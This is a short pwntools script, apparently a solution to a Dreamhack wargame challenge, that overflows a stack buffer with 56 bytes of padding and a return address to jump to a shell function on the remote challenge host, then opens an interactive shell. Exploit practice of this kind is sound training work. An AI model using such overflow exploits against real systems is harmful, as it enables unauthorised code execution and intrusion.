from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 21233
r = remote(HOST, PORT)

sh = 0x4006aa
r.sendlineafter(b': ', b'A' * 56 + p64(sh))
r.interactive()